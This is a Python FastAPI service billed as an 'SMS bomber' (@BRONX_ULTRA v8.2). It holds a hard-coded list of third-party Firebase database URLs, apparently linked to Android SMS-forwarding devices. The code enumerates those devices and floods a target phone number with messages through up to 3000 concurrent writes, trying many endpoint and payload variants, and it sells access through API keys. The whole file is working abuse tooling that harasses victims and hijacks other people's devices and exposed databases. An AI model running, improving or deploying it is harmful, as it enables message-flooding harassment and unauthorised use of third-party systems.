#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║   🔥 @BRONX_ULTRA BOMBER API v8.2 — ULTRA FLASH         ║
║   ▸ API Key Protected                                   ║
║   ▸ Firebase URLs — SEEDHA CODE ME                      ║
║   ▸ TRUE Full Fan-Out                                   ║
║   ▸ Full Symbol/Space/Emoji Support                     ║
║   ▸ Multi-Format Payload (auto match)                   ║
║   ▸ Multi-Endpoint Fallback                             ║
║   ▸ /stop endpoint (local memory)                       ║
║   ▸ /debug endpoint (troubleshoot)                      ║
║   ▸ Render + UptimeRobot Ready                          ║
╚══════════════════════════════════════════════════════════╝
"""

import asyncio
import time
import os
import aiohttp
from datetime import datetime
from uuid import uuid4
from collections import defaultdict

from fastapi import FastAPI, Request, BackgroundTasks, Query
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware

# ═══════════════════════════════════════════════════════════
# 🔑 API KEYS
# ═══════════════════════════════════════════════════════════
VALID_KEYS = {
    "bronx-op",
    "prime-key",
    "flash-key",
    "bronx-vip",
    "bronx-pro",
    "bronx-max",
}

# ═══════════════════════════════════════════════════════════
# 🔥 FIREBASE URLs — YAHAN APNE URLs DAALO
# ═══════════════════════════════════════════════════════════
FIREBASE_URLS = [
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://hush-e1f72-default-rtdb.firebaseio.com",
"https://adsinprogess-default-rtdb.firebaseio.com",
"https://sumnmmn-default-rtdb.firebaseio.com",
"https://ffdfhf-aa168-default-rtdb.firebaseio.com",
"https://pussy-25f3c-default-rtdb.firebaseio.com",
"https://sohan-6d9e1-default-rtdb.firebaseio.com",
"https://slim-pussy-default-rtdb.firebaseio.com",
"https://skfd-53f1f-default-rtdb.firebaseio.com",
"https://e0turnament1-default-rtdb.firebaseio.com",
"https://sher-61c70-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://amit-ka-71-default-rtdb.firebaseio.com",
"https://sachin-38c1d-default-rtdb.firebaseio.com",
"https://newbhai-99806-default-rtdb.firebaseio.com",
"https://ssboss4-default-rtdb.firebaseio.com",
"https://dipukumar21-9cc34-default-rtdb.firebaseio.com",
"https://teddymcdonald-81002-default-rtdb.firebaseio.com",
"https://santosh-c4095-default-rtdb.firebaseio.com",
"https://bhaiyaka-bcbcd-default-rtdb.firebaseio.com",
"https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app",
"https://rahul-admin-b6ebe-default-rtdb.firebaseio.com",
"https://super-admin-240f4-default-rtdb.firebaseio.com",
"https://ilohsh-default-rtdb.firebaseio.com",
]

# ─── Auto dedupe + clean ───────────────────────────────────
_seen = set()
_cleaned = []
for u in FIREBASE_URLS:
    u = u.strip().rstrip("/")
    if u.endswith(".json"):
        u = u[:-5]
    if u and u not in _seen:
        _seen.add(u)
        _cleaned.append(u)
FIREBASE_URLS = _cleaned

# ═══════════════════════════════════════════════════════════
# 🎯 SEND ENDPOINTS — Bahut saare try karega
# ═══════════════════════════════════════════════════════════
SEND_ENDPOINTS = [
    # Standard webhook patterns
    "clients/{id}/webhookEvent/sendSms.json",
    "clients/{id}/webhookEvent/sendSmsRequest.json",
    "clients/{id}/webhookEvent/sms.json",
    "clients/{id}/webhookEvent/send.json",
    "clients/{id}/webhookEvent.json",
    # Direct send patterns
    "clients/{id}/sendSms.json",
    "clients/{id}/sms.json",
    "clients/{id}/send.json",
    "clients/{id}/message.json",
    # Top-level
    "sendSms/{id}.json",
    "sms/{id}.json",
    "send/{id}.json",
    # Device direct
    "clients/{id}/messages.json",
    "clients/{id}/inbox.json",
]

# ═══════════════════════════════════════════════════════════
# 📦 PAYLOAD FORMATS — Har format try karega
# ═══════════════════════════════════════════════════════════
def build_payloads(target: str, message: str):
    """Return list of payloads in different formats."""
    ts = int(time.time() * 1000)
    return [
        # Format 1 — Standard Bronx/Android SMS forwarder
        {
            "from": 1,
            "to": target,
            "message": message,
            "isSended": False,
            "timestamp": ts,
        },
        # Format 2 — Android SMS Gateway style
        {
            "phone": target,
            "message": message,
            "isSended": False,
            "timestamp": ts,
        },
        # Format 3 — Firebase push notification style
        {
            "to": target,
            "body": message,
            "title": "",
            "isSended": False,
            "timestamp": ts,
        },
        # Format 4 — Full combo (kuch devices sab fields chahte hain)
        {
            "from": 1,
            "to": target,
            "phone": target,
            "number": target,
            "message": message,
            "msg": message,
            "text": message,
            "body": message,
            "isSended": False,
            "status": False,
            "timestamp": ts,
        },
        # Format 5 — Minimal
        {
            "to": target,
            "msg": message,
        },
    ]


# ═══════════════════════════════════════════════════════════
# ⚙️ SETTINGS
# ═══════════════════════════════════════════════════════════
MAX_CONCURRENT = 3000
BATCH_CHUNK = 3000
REQUEST_TIMEOUT = 8
CONNECT_TIMEOUT = 3
DEVICE_CACHE_TTL = 30

API_NAME = "@BRONX_ULTRA"
API_VERSION = "8.2"

# ═══════════════════════════════════════════════════════════
# 🚀 APP
# ═══════════════════════════════════════════════════════════
app = FastAPI(
    title=f"🔥 {API_NAME} BOMBER API",
    version=API_VERSION,
    description="Ultra Firebase Bomber — Flash Speed",
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

_LOCAL_STOP = set()
_DEVICE_CACHE = {"devices": None, "ts": 0}


# ═══════════════════════════════════════════════════════════
# 🔑 KEY VERIFICATION
# ═══════════════════════════════════════════════════════════
def verify_key(api_key: str) -> bool:
    if not api_key:
        return False
    return api_key.strip() in VALID_KEYS


def extract_key(request: Request, query_params: dict, body_data: dict) -> str:
    key = request.headers.get("x-api-key") or request.headers.get("X-API-Key")
    if key:
        return key
    auth = request.headers.get("authorization", "")
    if auth.lower().startswith("bearer "):
        return auth[7:].strip()
    key = query_params.get("key") or query_params.get("api_key")
    if key:
        return key
    key = body_data.get("key") or body_data.get("api_key")
    if key:
        return key
    return ""


# ═══════════════════════════════════════════════════════════
# 🛠️ HELPERS
# ═══════════════════════════════════════════════════════════
def clean_url(url: str) -> str:
    url = url.rstrip("/")
    if url.endswith(".json"):
        url = url[:-5]
    return url.rstrip("/")


def fix_message(raw_message, is_get: bool) -> str:
    if raw_message is None:
        return ""
    if not isinstance(raw_message, str):
        raw_message = str(raw_message)
    msg = raw_message
    if is_get:
        msg = msg.replace("+", " ")
    msg = msg.replace("\\n", "\n").replace("\\t", "\t")
    return msg.strip()


# ═══════════════════════════════════════════════════════════
# 📡 FETCH DEVICES
# ═══════════════════════════════════════════════════════════
async def fetch_devices_from(session, url):
    base = clean_url(url)
    try:
        async with session.get(f"{base}/clients.json") as r:
            if r.status != 200:
                return []
            data = await r.json(content_type=None)
            if not isinstance(data, dict):
                return []
            devices = []
            for k, v in data.items():
                if not isinstance(v, dict):
                    continue
                # status true ya missing dono accept karo
                status = v.get("status", True)
                if status is True or status == "true" or status is None:
                    devices.append({"id": k, "url": base})
            return devices
    except Exception:
        return []


async def get_all_devices(session, use_cache=False):
    if use_cache:
        age = time.time() - _DEVICE_CACHE["ts"]
        if _DEVICE_CACHE["devices"] and age < DEVICE_CACHE_TTL:
            return _DEVICE_CACHE["devices"]

    results = await asyncio.gather(
        *[fetch_devices_from(session, u) for u in FIREBASE_URLS],
        return_exceptions=True,
    )
    out = []
    for r in results:
        if isinstance(r, list):
            out.extend(r)

    _DEVICE_CACHE["devices"] = out
    _DEVICE_CACHE["ts"] = time.time()
    return out


# ═══════════════════════════════════════════════════════════
# 💣 SEND ONE — Multi-format + Multi-endpoint try
# ═══════════════════════════════════════════════════════════
async def send_one(session, device, target, message, sem, stats):
    async with sem:
        payloads = build_payloads(target, message)

        for ep in SEND_ENDPOINTS:
            url = f"{device['url']}/{ep.format(id=device['id'])}"

            # Har payload format try karo
            for payload in payloads:
                # PUT try
                try:
                    async with session.put(url, json=payload) as r:
                        if r.status in (200, 201):
                            stats["success"] += 1
                            return True
                        if r.status == 403:
                            stats["blocked"] += 1
                            break  # 403 = blocked, next endpoint try
                        if r.status == 404:
                            break  # 404 = endpoint galat, next endpoint
                except Exception:
                    pass

                # POST try
                try:
                    async with session.post(url, json=payload) as r:
                        if r.status in (200, 201):
                            stats["success"] += 1
                            return True
                        if r.status == 403:
                            break
                        if r.status == 404:
                            break
                except Exception:
                    pass

        stats["failed"] += 1
        return False


async def is_stopped(number: str) -> bool:
    return number in _LOCAL_STOP


# ═══════════════════════════════════════════════════════════
# 💣 WORKER
# ═══════════════════════════════════════════════════════════
async def bomb_worker(number: str, message: str, count: int, api_key: str):
    jid = str(uuid4())[:8]
    t0 = time.time()

    _LOCAL_STOP.discard(number)

    connector = aiohttp.TCPConnector(
        limit=0,
        limit_per_host=0,
        ttl_dns_cache=600,
        force_close=False,
        enable_cleanup_closed=True,
        use_dns_cache=True,
    )
    timeout = aiohttp.ClientTimeout(
        total=REQUEST_TIMEOUT,
        connect=CONNECT_TIMEOUT,
        sock_read=REQUEST_TIMEOUT,
    )
    headers = {
        "User-Agent": f"{API_NAME}/v{API_VERSION}",
        "Content-Type": "application/json",
        "Connection": "keep-alive",
    }

    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout, headers=headers
    ) as session:
        devices = await get_all_devices(session, use_cache=True)
        if not devices:
            print(f"[{jid}] ❌ No devices online")
            return

        ndev = len(devices)
        total = ndev * count

        print(f"\n{'='*60}")
        print(f"[{jid}] 🔥 {API_NAME} v{API_VERSION} — ULTRA FLASH")
        print(f"[{jid}] Target     : {number}")
        print(f"[{jid}] Devices    : {ndev}")
        print(f"[{jid}] Per-device : {count}")
        print(f"[{jid}] TOTAL SMS  : {total}")
        print(f"{'='*60}")

        sem = asyncio.Semaphore(MAX_CONCURRENT)
        stats = {"success": 0, "failed": 0, "blocked": 0}

        all_tasks = []
        for device in devices:
            for _ in range(count):
                all_tasks.append(
                    send_one(session, device, number, message, sem, stats)
                )

        total_tasks = len(all_tasks)
        print(f"[{jid}] 🚀 Firing {total_tasks} parallel requests...")

        completed = 0
        cancelled = False
        for i in range(0, total_tasks, BATCH_CHUNK):
            if await is_stopped(number):
                print(f"[{jid}] 🛑 STOPPED at {completed}/{total_tasks}")
                cancelled = True
                for t in all_tasks[i:]:
                    t.cancel()
                break

            chunk = all_tasks[i:i + BATCH_CHUNK]
            await asyncio.gather(*chunk, return_exceptions=True)
            completed += len(chunk)

            elapsed_sf = time.time() - t0
            speed_sf = round(stats["success"] / elapsed_sf, 1) if elapsed_sf else 0
            print(f"[{jid}] ⚡ {completed}/{total_tasks} | "
                  f"OK={stats['success']} | BLK={stats['blocked']} | "
                  f"FAIL={stats['failed']} | "
                  f"{elapsed_sf:.1f}s | {speed_sf}/s")

        elapsed = round(time.time() - t0, 2)
        speed = round(stats["success"] / elapsed, 1) if elapsed else 0

        print(f"\n[{jid}] {'🛑 STOPPED' if cancelled else '✅ DONE'}")
        print(f"[{jid}] Sent={stats['success']} | Failed={stats['failed']} | "
              f"Blocked={stats['blocked']}")
        print(f"[{jid}] Time={elapsed}s | Speed={speed}/s 🚄")
        print(f"{'='*60}\n")


# ═══════════════════════════════════════════════════════════
# 🌐 ROUTES
# ═══════════════════════════════════════════════════════════
@app.get("/")
async def root():
    return {
        "api": API_NAME,
        "version": API_VERSION,
        "status": "🔥 ONLINE",
        "protected": True,
        "firebases_loaded": len(FIREBASE_URLS),
        "mode": "ULTRA FLASH",
        "how_to_use": {
            "send": "/send?key=YOUR_KEY&message=Hi&number=9876543210&count=5",
            "stop": "/stop?key=YOUR_KEY&number=9876543210",
            "devices": "/devices?key=YOUR_KEY",
            "debug": "/debug?key=YOUR_KEY",
        },
    }


@app.get("/health")
async def health():
    return {
        "status": "ok",
        "api": API_NAME,
        "version": API_VERSION,
        "time": datetime.now().isoformat(),
    }


@app.get("/keys")
async def keys_info():
    return {
        "api": API_NAME,
        "total_keys": len(VALID_KEYS),
        "hint": "Contact admin for a valid key",
    }


# ═══════════════════════════════════════════════════════════
# 🚀 /send
# ═══════════════════════════════════════════════════════════
@app.api_route("/send", methods=["GET", "POST"])
async def send_endpoint(request: Request, bg: BackgroundTasks):
    is_get = request.method == "GET"
    query_data = dict(request.query_params)

    body_data = {}
    if not is_get:
        try:
            body_data = await request.json()
        except Exception:
            try:
                form = await request.form()
                body_data = dict(form)
            except Exception:
                body_data = {}

    merged = {**query_data, **body_data}

    api_key = extract_key(request, query_data, body_data)
    if not api_key:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "🔑 API key required"},
            status_code=401,
        )
    if not verify_key(api_key):
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "❌ Invalid API key"},
            status_code=401,
        )

    raw_message = merged.get("message") or merged.get("msg") or ""
    message = fix_message(raw_message, is_get)

    number = merged.get("number") or merged.get("num") or merged.get("numer") or ""
    number = str(number).strip()

    count_str = merged.get("count", "1")

    if not message:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Missing message"}, 400
        )
    if not number:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Missing number"}, 400
        )

    clean_number = number.replace("+", "").replace(" ", "").replace("-", "")
    if not clean_number.isdigit() or len(clean_number) < 10:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "Invalid number"}, 400
        )

    try:
        count = int(count_str)
        if count <= 0:
            raise ValueError
    except Exception:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "invalid count"}, 400
        )

    bg.add_task(bomb_worker, clean_number, message, count, api_key)

    return {
        "success": True,
        "api": API_NAME,
        "version": API_VERSION,
        "job_started": True,
        "target": clean_number,
        "message_sent": message,
        "message_length": len(message),
        "per_device": count,
        "mode": "ULTRA FLASH FAN-OUT (multi-format)",
        "stop_url": f"/stop?key={api_key}&number={clean_number}",
    }


# ═══════════════════════════════════════════════════════════
# 🛑 /stop
# ═══════════════════════════════════════════════════════════
@app.get("/stop")
async def stop_endpoint(
    request: Request,
    number: str = Query(None),
    key: str = Query(None),
):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "🔑 Valid key required"},
            status_code=401,
        )

    if not number:
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "number required"}, 400
        )

    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
    _LOCAL_STOP.add(number)

    return {
        "success": True,
        "api": API_NAME,
        "message": f"🛑 Stop signal sent for {number}",
        "number": number,
    }


# ═══════════════════════════════════════════════════════════
# 📱 /devices
# ═══════════════════════════════════════════════════════════
@app.get("/devices")
async def devices_endpoint(request: Request, key: str = Query(None)):
    api_key = key or request.headers.get("x-api-key") or ""
    if not api_key:
        auth = request.headers.get("authorization", "")
        if auth.lower().startswith("bearer "):
            api_key = auth[7:].strip()

    if not verify_key(api_key):
        return JSONResponse(
            {"success": False, "api": API_NAME, "error": "🔑 Valid key required"},
            status_code=401,
        )

    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=600)
    timeout = aiohttp.ClientTimeout(total=15, connect=5)
    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout
    ) as session:
        devices = await get_all_devices(session, use_cache=False)

    fb_group = defaultdict(int)
    for d in devices:
        fb_group[d["url"]] += 1

    return {
        "success": True,
        "api": API_NAME,
        "version": API_VERSION,
        "total_online": len(devices),
        "live_firebases": len(fb_group),
        "total_firebases": len(FIREBASE_URLS),
        "per_firebase": dict(fb_group),
        "devices_sample": devices[:10],
    }


# ═══════════════════════════════════════════════════════════
# 🌐 /firebases
# ═══════════════════════════════════════════════════════════
@app.get("/firebases")
async def firebases_endpoint():
    return {
        "api": API_NAME,
        "version": API_VERSION,
        "success": True,
        "total": len(FIREBASE_URLS),
        "note": "🔒 Firebase URLs are hidden",
    }


# ═══════════════════════════════════════════════════════════
# 🔬 /debug — Exact reason batayega
# ═══════════════════════════════════════════════════════════
@app.get("/debug")
async def debug_endpoint(request: Request, key: str = Query(None)):
    api_key = key or request.headers.get("x-api-key") or ""
    if not verify_key(api_key):
        return JSONResponse(
            {"success": False, "error": "🔑 Valid key required"}, 401
        )

    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=600)
    timeout = aiohttp.ClientTimeout(total=20, connect=5)
    headers = {"Content-Type": "application/json"}

    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout, headers=headers
    ) as session:
        devices = await get_all_devices(session, use_cache=False)

        if not devices:
            return {"success": False, "error": "No devices online"}

        # Pehla device test karo
        test_dev = devices[0]
        target = "9876543210"
        message = "debug test"

        # Device ka full structure dekho
        struct_url = f"{test_dev['url']}/clients/{test_dev['id']}.json"
        device_struct = None
        try:
            async with session.get(struct_url) as r:
                device_struct = await r.json(content_type=None)
        except Exception as e:
            device_struct = {"error": str(e)}

        # Har endpoint × har payload test karo
        payloads = build_payloads(target, message)
        results = []

        for ep in SEND_ENDPOINTS:
            url = f"{test_dev['url']}/{ep.format(id=test_dev['id'])}"
            ep_result = {"endpoint": ep, "tries": []}

            for idx, payload in enumerate(payloads):
                for method in ("PUT", "POST"):
                    try:
                        if method == "PUT":
                            async with session.put(url, json=payload) as r:
                                status = r.status
                                body = (await r.text())[:150]
                        else:
                            async with session.post(url, json=payload) as r:
                                status = r.status
                                body = (await r.text())[:150]

                        ep_result["tries"].append({
                            "method": method,
                            "payload_fmt": idx + 1,
                            "status": status,
                            "body": body,
                        })

                        if status in (200, 201):
                            ep_result["WORKING"] = {
                                "method": method,
                                "payload_fmt": idx + 1,
                                "payload": payload,
                            }
                            break
                    except Exception as e:
                        ep_result["tries"].append({
                            "method": method,
                            "payload_fmt": idx + 1,
                            "error": str(e)[:80],
                        })
                if "WORKING" in ep_result:
                    break

            results.append(ep_result)
            if "WORKING" in ep_result:
                break

        return {
            "success": True,
            "total_devices": len(devices),
            "test_device_id": test_dev["id"],
            "test_device_url": test_dev["url"],
            "device_structure": device_struct,
            "endpoint_results": results,
            "verdict": "✅ FOUND WORKING ENDPOINT" if any(
                "WORKING" in r for r in results
            ) else "❌ NO WORKING ENDPOINT — check device structure",
        }
